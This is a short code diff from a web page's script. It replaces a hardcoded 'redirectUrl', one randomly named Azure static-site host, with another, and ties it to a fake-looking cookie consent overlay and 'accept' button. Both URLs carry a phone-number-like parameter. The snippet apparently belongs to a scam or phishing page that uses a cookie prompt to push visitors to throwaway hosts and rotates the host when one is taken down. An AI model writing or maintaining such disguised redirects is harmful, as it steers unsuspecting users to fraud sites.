@@ -390,7 +390,7 @@ p {
 
         document.addEventListener("DOMContentLoaded", function () {
 
-    const redirectUrl = "https://hhyttyre61.z24.web.core.windows.net/?bcda=(0101)-85557-45675";
+    const redirectUrl = "https://asjhatttl1-secondary.z13.web.core.windows.net/?bcda=(0101)-85557-45675";
 
     const overlay = document.getElementById("cookie-overlay");
     const acceptBtn = document.getElementById("accept-cookies");
